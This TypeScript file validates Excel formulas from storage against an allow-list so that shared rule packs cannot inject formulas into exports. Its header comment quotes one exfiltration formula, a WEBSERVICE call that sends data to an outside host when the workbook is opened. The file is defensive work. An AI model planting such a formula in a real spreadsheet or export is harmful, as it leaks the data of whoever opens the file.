/**
 * Allow-list check for an Excel formula that came from storage (security
 * review 2026-10-15, finding #1). Rule packs are shared, and the API accepts
 * `excelFormula` from any signed-in user, so a stored formula such as
 * `WEBSERVICE("http://host/?d="&ingress)` must never be written into an export
 * that a colleague opens in Excel (fullCalcOnLoad would run it).
 *
 * A stored formula is reused only when it uses the same constructs the importer
 * accepts: defined names, literals, operators and SUPPORTED_EXCEL_FUNCTIONS. Cell
 * and external references, array constants and error literals are refused.
 * Anything else falls back to the DSL->Excel translation, which only emits
 * allow-listed functions.
 */
import { FormulaSyntaxError, parseExcelFormula, type XNode } from './excelFormula'
import { SUPPORTED_EXCEL_FUNCTIONS } from './translate'

const ALLOWED_FUNCTIONS = new Set<string>(SUPPORTED_EXCEL_FUNCTIONS)

function nodeIsSafe(node: XNode): boolean {
  switch (node.type) {
    case 'num':
    case 'str':
    case 'bool':
    case 'missing':
      return true
    case 'name':
      // Plain defined names only; a sheet-qualified name can point into another workbook part.
      return node.sheet === null
    case 'unary':
    case 'percent':
      return nodeIsSafe(node.arg)
    case 'binary':
    case 'range':
      return nodeIsSafe(node.left) && nodeIsSafe(node.right)
    case 'call':
      return ALLOWED_FUNCTIONS.has(node.name) && node.args.every(nodeIsSafe)
    case 'ref':
    case 'external':
    case 'errlit':
    case 'array':
      return false
  }
}

/** True when a stored Excel formula may be written back into an export as-is. */
export function isSafeStoredExcelFormula(formula: string): boolean {
  try {
    return nodeIsSafe(parseExcelFormula(formula))
  } catch (e) {
    if (e instanceof FormulaSyntaxError) return false
    throw e
  }
}
